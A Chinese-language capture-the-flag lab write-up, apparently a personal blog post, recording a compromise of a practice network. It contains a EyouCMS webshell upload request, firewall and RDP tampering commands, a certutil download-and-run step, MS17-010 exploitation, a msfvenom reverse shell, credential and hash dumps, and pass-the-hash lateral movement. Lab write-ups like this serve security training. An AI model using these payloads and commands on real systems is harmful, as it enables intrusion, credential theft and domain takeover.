{"pageProps":{"postData":{"id":"CyberstrikelabLab-1","contentHtml":"<h1>Lab-1</h1>\n<blockquote>\n<p><a href=\"https://www.cyberstrikelab.com/#/scene/detail/20\">https://www.cyberstrikelab.com/#/scene/detail/20</a></p>\n</blockquote>\n<h2>Youcms</h2>\n<p><code>youcms</code></p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image.png\" alt=\"image.png\"></p>\n<p>网上能找到 <code>youcms</code> 前台 <code>getshell</code> 的利用</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/qq_48985780/article/details/121945304\">https://blog.csdn.net/qq_48985780/article/details/121945304</a></p>\n</blockquote>\n<pre><code class=\"hljs language-php\">POST /index.php/api/Uploadify/preview HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\nAccept-Language: zh-CN,zh;q=<span class=\"hljs-number\">0.8</span>,zh-TW;q=<span class=\"hljs-number\">0.7</span>,zh-HK;q=<span class=\"hljs-number\">0.5</span>,en-US;q=<span class=\"hljs-number\">0.3</span>,en;q=<span class=\"hljs-number\">0.2</span>\nUpgrade-Insecure-Requests: <span class=\"hljs-number\">1</span>\nPriority: u=<span class=\"hljs-number\">0</span>, i\nUser-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">141.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">141.0</span>\nAccept-Encoding: gzip, deflate\nSec-GPC: <span class=\"hljs-number\">1</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*<span class=\"hljs-comment\">/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgcGhwaW5mbygpOw==\n</span></code></pre>\n<p>访问返回包中的 <code>preview/xxxxxxx.php</code></p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image1.png\" alt=\"image.png\"></p>\n<p>写入一句话木马</p>\n<pre><code class=\"hljs language-php\">POST /index.php/api/Uploadify/preview HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\nAccept-Language: zh-CN,zh;q=<span class=\"hljs-number\">0.8</span>,zh-TW;q=<span class=\"hljs-number\">0.7</span>,zh-HK;q=<span class=\"hljs-number\">0.5</span>,en-US;q=<span class=\"hljs-number\">0.3</span>,en;q=<span class=\"hljs-number\">0.2</span>\nUpgrade-Insecure-Requests: <span class=\"hljs-number\">1</span>\nPriority: u=<span class=\"hljs-number\">0</span>, i\nUser-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">141.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">141.0</span>\nAccept-Encoding: gzip, deflate\nSec-GPC: <span class=\"hljs-number\">1</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*<span class=\"hljs-comment\">/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\n\ndata:image/php;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsneCddKTs=\n</span></code></pre>\n<p>测试，是 <code>windows</code></p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image2.png\" alt=\"image.png\"></p>\n<h2>192.168.10.10</h2>\n<p>进行反弹 <code>shell</code></p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image3.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image4.png\" alt=\"image.png\"></p>\n<p>先把防火墙关了，然后开启远程桌面</p>\n<pre><code class=\"hljs language-php\">PS C:\\phpstudy_pro\\WWW\\eyoucms1.<span class=\"hljs-number\">0</span>\\preview> netsh advfirewall set allprofiles state off\nOk.\n\nPS C:\\phpstudy_pro\\WWW\\eyoucms1.<span class=\"hljs-number\">0</span>\\preview> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\nThe operation completed successfully.\n</code></pre>\n<p>之后再上线 <code>Vshell</code> ，使用一键上线命令即可</p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image5.png\" alt=\"image.png\"></p>\n<p><code>C</code> 盘根目录第一个 flag</p>\n<pre><code class=\"hljs language-php\">C:\\>type flag.txt\ngo-flag{kn6anDUCzBqtjlX8}\n</code></pre>\n<p>这里为了方便所以上 <code>MSF</code> 抓了下 <code>HASH</code></p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image6.png\" alt=\"image.png\"></p>\n<p>这里可以使用 <code>evil-winrm</code> 进行登陆了</p>\n<pre><code class=\"hljs language-php\">meterpreter > creds_all\n[+] Running <span class=\"hljs-keyword\">as</span> SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername       Domain           NTLM                              SHA1\n--------       ------           ----                              ----\nAdministrator  WIN-KOHRC1DGOL9  a167976f7bd8d93ee232fa7a87a4079e  <span class=\"hljs-number\">8</span>b8bca113dee7e588272b1ca6b73b16d017d4434\n\nwdigest credentials\n===================\n\nUsername          Domain           Password\n--------          ------           --------\n(<span class=\"hljs-literal\">null</span>)            (<span class=\"hljs-literal\">null</span>)           (<span class=\"hljs-literal\">null</span>)\nAdministrator     WIN-<span class=\"hljs-title function_ invoke__\">KOHRC1DGOL9</span>  (<span class=\"hljs-literal\">null</span>)\nWIN-KOHRC1DGOL9$  <span class=\"hljs-title function_ invoke__\">WORKGROUP</span>        (<span class=\"hljs-literal\">null</span>)\n\nkerberos credentials\n====================\n\nUsername          Domain           Password\n--------          ------           --------\n(<span class=\"hljs-literal\">null</span>)            (<span class=\"hljs-literal\">null</span>)           (<span class=\"hljs-literal\">null</span>)\nAdministrator     WIN-<span class=\"hljs-title function_ invoke__\">KOHRC1DGOL9</span>  (<span class=\"hljs-literal\">null</span>)\nwin-kohrc1dgol9$  <span class=\"hljs-title function_ invoke__\">WORKGROUP</span>        (<span class=\"hljs-literal\">null</span>)\n</code></pre>\n<p><code>IP</code> 信息</p>\n<pre><code class=\"hljs language-php\">C:\\>ipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网 <span class=\"hljs-number\">3</span>:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::<span class=\"hljs-variable constant_\">f934</span>:<span class=\"hljs-number\">2031</span>:ffb0:abe5%<span class=\"hljs-number\">17</span>\n   IPv4 地址 . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\n   子网掩码  . . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span>\n   默认网关. . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.233</span>\n\n以太网适配器 以太网实例 <span class=\"hljs-number\">0</span>:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::<span class=\"hljs-variable constant_\">dd76</span>:<span class=\"hljs-number\">17</span>c3:eada:<span class=\"hljs-number\">75</span>fb%<span class=\"hljs-number\">16</span>\n   IPv4 地址 . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.10</span>\n   子网掩码  . . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span>\n   默认网关. . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.1</span>\n\n隧道适配器 isatap.{<span class=\"hljs-number\">4</span>DA50EBB-<span class=\"hljs-number\">5871</span>-<span class=\"hljs-number\">4387</span>-AB71-FF1EF08A5B10}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n\n隧道适配器 isatap.{<span class=\"hljs-number\">0</span>A087C82-<span class=\"hljs-number\">408</span>A-<span class=\"hljs-number\">4</span>C20-<span class=\"hljs-number\">8</span>EB3-<span class=\"hljs-number\">4E5</span>C11A340D7}:\n\n   媒体状态  . . . . . . . . . . . . : 媒体已断开\n   连接特定的 DNS 后缀 . . . . . . . :\n</code></pre>\n<p>找到内网网段 <code>192.168.20.x</code></p>\n<p>上传 <code>fscan</code> 扫描</p>\n<pre><code class=\"hljs language-php\">PS C:\\> ./fscan -h <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.1</span>-<span class=\"hljs-number\">255</span>\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-08-12 07:42:18] [INFO] 暴力破解线程数: 1\n[2025-08-12 07:42:18] [INFO] 开始信息扫描\n[2025-08-12 07:42:18] [INFO] 生成IP范围: 192.168.20.1 - 192.168.20.255\n[2025-08-12 07:42:18] [INFO] 最终有效主机数量: 255\n[2025-08-12 07:42:18] [INFO] 开始主机扫描\n[2025-08-12 07:42:18] [SUCCESS] 目标 192.168.20.10   存活 (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.20   存活 (ICMP)\n[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.30   存活 (ICMP)\n[2025-08-12 07:42:21] [INFO] 存活主机数量: 3\n[2025-08-12 07:42:21] [INFO] 有效端口数量: 233\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.20:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:135\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:88\n[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:80\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:445\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:389\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:139\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:139\n[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:139\n[2025-08-12 07:42:26] [SUCCESS] 端口开放 192.168.20.10:3306\n[2025-08-12 07:42:26] [SUCCESS] 服务识别 192.168.20.10:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host '</span>WIN-KOHRC1DGOL9<span class=\"hljs-string\">' is not allowed\nto connect to this MySQL server]\n[2025-08-12 07:42:27] [SUCCESS] 服务识别 192.168.20.30:88 => \n[2025-08-12 07:42:30] [SUCCESS] 服务识别 192.168.20.10:80 => [http]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:445 => \n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:445 => \n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:139 =>  Banner:[.]\n[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:445 => \n[2025-08-12 07:42:36] [SUCCESS] 服务识别 192.168.20.30:389 => \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.30:135 => \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.20:135 => \n[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.10:135 => \n[2025-08-12 07:43:27] [INFO] 存活端口数量: 13\n[2025-08-12 07:43:27] [INFO] 开始漏洞扫描\n[2025-08-12 07:43:27] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.10\n主机名: WIN-KOHRC1DGOL9\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.10.10\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.20\n主机名: cyberweb\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.20\n[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.20 [Windows Server 2012 R2 Standard 9600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.30 [Windows Server 2008 R2 Standard 7600] MS17-010\n[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果\n目标主机: 192.168.20.30\n主机名: WIN-7NRTJO59O7N\n发现的网络接口:\n   IPv4地址:\n      └─ 192.168.20.30\n[2025-08-12 07:43:28] [SUCCESS] NetBios 192.168.20.10   WORKGROUP\\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600\n[2025-08-12 07:43:30] [SUCCESS] 网站标题 http://192.168.20.10      状态码:200 长度:25229  标题:易优CMS -  Powered by Eyoucms.com\n[2025-08-12 07:43:40] [SUCCESS] 目标: http://192.168.20.10:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n</span></code></pre>\n<p><code>192.168.20.20</code> 和 <code>30</code> 发现永恒之蓝</p>\n<h2>192.168.20.20 - 1</h2>\n<p>打永恒之蓝需要搭代理</p>\n<p>这里使用 <code>stowaway</code></p>\n<pre><code class=\"hljs language-php\">./linux_x64_admin -l <span class=\"hljs-number\">8000</span> -s <span class=\"hljs-number\">123</span>\n\nStart-Process -FilePath <span class=\"hljs-string\">\"C:\\agent.exe\"</span> -ArgumentList <span class=\"hljs-string\">\"-c 172.16.233.2:8000 -s 123 --reconnect 8\"</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">(admin) >> <span class=\"hljs-keyword\">use</span> 0\n(<span class=\"hljs-title\">node</span> 0) >> <span class=\"hljs-title\">socks</span> 4444 <span class=\"hljs-title\">admin</span> <span class=\"hljs-title\">admin</span>\n[*] <span class=\"hljs-title\">Trying</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">listen</span> <span class=\"hljs-title\">on</span> 0.0.0.0:4444......\n[*] <span class=\"hljs-title\">Waiting</span> <span class=\"hljs-title\">for</span> <span class=\"hljs-title\">agent</span>'<span class=\"hljs-title\">s</span> <span class=\"hljs-title\">response</span>......\n[*] <span class=\"hljs-title\">Socks</span> <span class=\"hljs-title\">start</span> <span class=\"hljs-title\">successfully</span>!\n</code></pre>\n<p>设置好代理后用 <code>MSF</code> 打永恒之蓝</p>\n<pre><code class=\"hljs language-php\">➜  Lab1 proxychains -q msfconsole\nsearch ms17_010\n<span class=\"hljs-keyword\">use</span> 19\n<span class=\"hljs-title\">set</span> <span class=\"hljs-title\">command</span> <span class=\"hljs-title\">whoami</span>\n<span class=\"hljs-title\">set</span> <span class=\"hljs-title\">rhost</span> 192.168.20.20\n<span class=\"hljs-title\">run</span>\n</code></pre>\n<p>但是这里应该是被修复了，先放着</p>\n<pre><code class=\"hljs language-php\">msf6 <span class=\"hljs-title function_ invoke__\">auxiliary</span>(admin/smb/ms17_010_command) > exploit\n\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.20</span>:<span class=\"hljs-number\">445</span>     - Target OS: Windows Server <span class=\"hljs-number\">2012</span> R2 Standard <span class=\"hljs-number\">9600</span>\n[-] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.20</span>:<span class=\"hljs-number\">445</span>     - Unable to find accessible named pipe!\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.20</span>:<span class=\"hljs-number\">445</span>     - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> <span class=\"hljs-title function_ invoke__\">hosts</span> (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<h2>192.168.20.30</h2>\n<p>转换目标，打 <code>192.168.20.30</code></p>\n<pre><code class=\"hljs language-php\">msf6 <span class=\"hljs-title function_ invoke__\">auxiliary</span>(admin/smb/ms17_010_command) > set rhost <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>\nrhost => <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>\nmsf6 <span class=\"hljs-title function_ invoke__\">auxiliary</span>(admin/smb/ms17_010_command) > set command whoami\ncommand => whoami\nmsf6 <span class=\"hljs-title function_ invoke__\">auxiliary</span>(admin/smb/ms17_010_command) > run\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Target OS: Windows Server <span class=\"hljs-number\">2008</span> R2 Standard <span class=\"hljs-number\">7600</span>\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Built a write-what-where primitive...\n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Overwrite complete... SYSTEM session obtained!\n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Service start timed out, OK <span class=\"hljs-keyword\">if</span> running a command <span class=\"hljs-keyword\">or</span> non-service executable...\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Getting the command output...\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Executing cleanup...\n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Cleanup was successful\n[+] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Command completed successfully!\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Output <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">\"whoami\"</span>:\n\nnt authority\\system\n\n[*] <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">445</span>     - Scanned <span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> <span class=\"hljs-title function_ invoke__\">hosts</span> (<span class=\"hljs-number\">100</span>% complete)\n[*] Auxiliary module execution completed\n</code></pre>\n<p>成功执行，准备上线 <code>Vshell</code></p>\n<p>通过 <code>stowaway</code> 将监听端口映射到 <code>192.168.20.10</code></p>\n<pre><code class=\"hljs language-php\">(node <span class=\"hljs-number\">0</span>) >> backward <span class=\"hljs-number\">1234</span> <span class=\"hljs-number\">1234</span>\n[*] Trying to ask node to listen on <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:<span class=\"hljs-number\">1234</span>......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Backward start successfully!\n</span></code></pre>\n<p>通过 <code>ms17_010</code> 进行上线</p>\n<pre><code class=\"hljs language-php\">set command <span class=\"hljs-string\">\"certutil.exe -urlcache -split -f http://192.168.20.10:1234/swt C:\\\\run.bat\"</span>\nrun\nset command <span class=\"hljs-string\">\"start C:\\\\run.bat\"</span>\nrun\n</code></pre>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image7.png\" alt=\"image.png\"></p>\n<p><code>C</code> 盘根目录能找到第二个 <code>flag</code></p>\n<pre><code class=\"hljs language-php\">go-flag{R0M4QwsS6EQp97lw}\n</code></pre>\n<p>关闭防火墙和开启远程桌面</p>\n<pre><code class=\"hljs language-php\">C:\\Windows\\system32>netsh advfirewall set allprofiles state off\n确定。\n\nC:\\Windows\\system32>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\n操作成功完成。\n</code></pre>\n<p>信息收集，发现该机器就是 DC</p>\n<pre><code class=\"hljs language-php\">C:\\Windows\\system32>net view\n服务器名称            注解\n\n-------------------------------------------------------------------------------\n\\\\CYBERWEB\n\\\\WIN-<span class=\"hljs-number\">7</span>NRTJO59O7N\n命令成功完成。\n\nPS C:\\> net view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\n命令成功完成。\n\nC:\\Windows\\system32>net view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\n命令成功完成。\n\nC:\\Windows\\system32>net group <span class=\"hljs-string\">\"domain controllers\"</span>\n组名     Domain Controllers\n注释     域中所有域控制器\n\n成员\n\n-------------------------------------------------------------------------------\nWIN-<span class=\"hljs-number\">7</span>NRTJO59O7N$\n</code></pre>\n<p>上线 <code>MSF</code> ，和上面上线 <code>Vshell</code>的操作类似</p>\n<pre><code class=\"hljs language-php\">(node <span class=\"hljs-number\">0</span>) >> backward <span class=\"hljs-number\">9009</span> <span class=\"hljs-number\">9009</span>\n[*] Trying to ask node to listen on <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:<span class=\"hljs-number\">9009</span>......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Backward start successfully!\n</span></code></pre>\n<pre><code class=\"hljs language-php\">msf6 <span class=\"hljs-title function_ invoke__\">exploit</span>(multi/handler) > set lport <span class=\"hljs-number\">9009</span>\nlport => <span class=\"hljs-number\">9009</span>\nmsf6 <span class=\"hljs-title function_ invoke__\">exploit</span>(multi/handler) > options\n\nPayload <span class=\"hljs-title function_ invoke__\">options</span> (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit <span class=\"hljs-title function_ invoke__\">technique</span> (<span class=\"hljs-attr\">Accepted</span>: <span class=\"hljs-string\">''</span>, seh, thread, process, none)\n   LHOST     <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>          yes       The listen <span class=\"hljs-title function_ invoke__\">address</span> (an <span class=\"hljs-keyword\">interface</span> may be specified)\n   LPORT     <span class=\"hljs-number\">9009</span>             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   <span class=\"hljs-number\">0</span>   Wildcard Target\n\nView the full module info with the info, <span class=\"hljs-keyword\">or</span> info -d command.\n\nmsf6 <span class=\"hljs-title function_ invoke__\">exploit</span>(multi/handler) > run\n[*] Started reverse TCP handler on <span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>:<span class=\"hljs-number\">9009</span> \n</code></pre>\n<pre><code class=\"hljs language-php\">➜  Lab1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.10</span> LPORT=<span class=\"hljs-number\">9009</span> -f exe -o shell.exe\n[-] No platform was selected, choosing <span class=\"hljs-title class_\">Msf</span>::<span class=\"hljs-variable constant_\">Module</span>::<span class=\"hljs-variable constant_\">Platform</span>::<span class=\"hljs-variable constant_\">Windows</span> <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: x64 <span class=\"hljs-keyword\">from</span> the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">510</span> bytes\nFinal size of exe file: <span class=\"hljs-number\">7168</span> bytes\nSaved <span class=\"hljs-keyword\">as</span>: shell.exe\n</code></pre>\n<p>将 <code>shell.exe</code> 上传到 <code>192.168.20.30</code> ，然后运行</p>\n<p><img src=\"/post-images/CyberstrikelabLab-1/image8.png\" alt=\"image.png\"></p>\n<p>抓取 <code>hash</code></p>\n<pre><code class=\"hljs language-php\">meterpreter > hashdump\nAdministrator:<span class=\"hljs-number\">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class=\"hljs-number\">94</span>bd5248e87cb7f2f9b871d40c903927:::\nGuest:<span class=\"hljs-number\">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class=\"hljs-number\">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:<span class=\"hljs-number\">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class=\"hljs-number\">5</span>bc02b7670084dd30471730cc0a1672c:::\ncyberweb:<span class=\"hljs-number\">1105</span>:aad3b435b51404eeaad3b435b51404ee:<span class=\"hljs-number\">2</span>de5cd0f15d1c070851d1044e1d95c90:::\nWIN-<span class=\"hljs-number\">7</span>NRTJO59O7N$:<span class=\"hljs-number\">1000</span>:aad3b435b51404eeaad3b435b51404ee:f056ff4d1ad036e570c5344bb3d4e65c:::\nCYBERWEB$:<span class=\"hljs-number\">1103</span>:aad3b435b51404eeaad3b435b51404ee:c9f108dc7ba78e084283c00e33dffeff:::\n</code></pre>\n<h2>192.168.20.20</h2>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-php\">➜  Lab1 proxychains -q nxc smb <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.20</span> -u administrator -H <span class=\"hljs-number\">94</span>bd5248e87cb7f2f9b871d40c903927 \nSMB         <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.20</span>   <span class=\"hljs-number\">445</span>    CYBERWEB         [*] Windows <span class=\"hljs-number\">8.1</span> / Server <span class=\"hljs-number\">2012</span> R2 Build <span class=\"hljs-number\">9600</span> <span class=\"hljs-title function_ invoke__\">x64</span> (<span class=\"hljs-attr\">name</span>:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True) \nSMB         <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.20</span>   <span class=\"hljs-number\">445</span>    CYBERWEB         [+] cyberstrikelab.com\\administrator:<span class=\"hljs-number\">94</span>bd5248e87cb7f2f9b871d40c903927 (Pwn3d!)\n</code></pre>\n<p><code>PTH</code> 拿下</p>\n<pre><code class=\"hljs language-php\">➜  Lab1 proxychains -q psexec.py cyberstrikelab.com/administrator@cyberweb.cyberstrikelab.com -hashes aad3b435b51404eeaad3b435b51404ee:<span class=\"hljs-number\">94</span>bd5248e87cb7f2f9b871d40c903927\n  import pkg_resources\nImpacket v0.<span class=\"hljs-number\">12.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[*] Requesting shares on cyberweb.cyberstrikelab.com.....\n[*] Found writable share ADMIN$\n[*] Uploading file pqpIKIBX.exe\n[*] Opening SVCManager on cyberweb.cyberstrikelab.com.....\n[*] Creating service WhKD on cyberweb.cyberstrikelab.com.....\n[*] Starting service WhKD.....\n[!] Press help <span class=\"hljs-keyword\">for</span> extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https:<span class=\"hljs-comment\">//docs.python.org/3/library/codecs.html#standard-encodings</span>\n<span class=\"hljs-keyword\">and</span> then execute smbexec.py again with -codec <span class=\"hljs-keyword\">and</span> the corresponding codec\nMicrosoft Windows [�汾 <span class=\"hljs-number\">6.3</span>.<span class=\"hljs-number\">9600</span>]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https:<span class=\"hljs-comment\">//docs.python.org/3/library/codecs.html#standard-encodings</span>\n<span class=\"hljs-keyword\">and</span> then execute smbexec.py again with -codec <span class=\"hljs-keyword\">and</span> the corresponding <span class=\"hljs-title function_ invoke__\">codec</span>\n(c) <span class=\"hljs-number\">2013</span> Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32>\n</code></pre>\n<p>读取第三个 <code>flag</code></p>\n<pre><code class=\"hljs language-php\">C:\\> type flag.txt\ngo-flag{Nb8VOT8X9SbIzyDI}\n</code></pre>","title":"Cyberstrikelab - Lab1","date":"2025-08-12","updated":"2025-08-12","tags":["Cyberstrikelab","Windows","Vshell","多层内网","MS17_010"],"categories":"靶机","comments":true,"description":"Lab-1\n\n https://www.cyberstrikelab.com/#/scene/detail/20\n \n\nYoucms\n\n`youcms`\n\n\n\n网上能找到 `youcms` 前台 `getshell` 的利用\n\n https://blog.csdn.net/qq_48985780/article/details/121945304\n \n\n\n\n访问返回包中的 `preview/xxx..."},"recentPosts":[{"id":"Sunshine + moonlight 息屏串流方案","title":"Sunshine + moonlight 息屏串流方案","date":"2025-10-18","isEncrypted":false,"year":"2025","month":"10","day":"18"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - 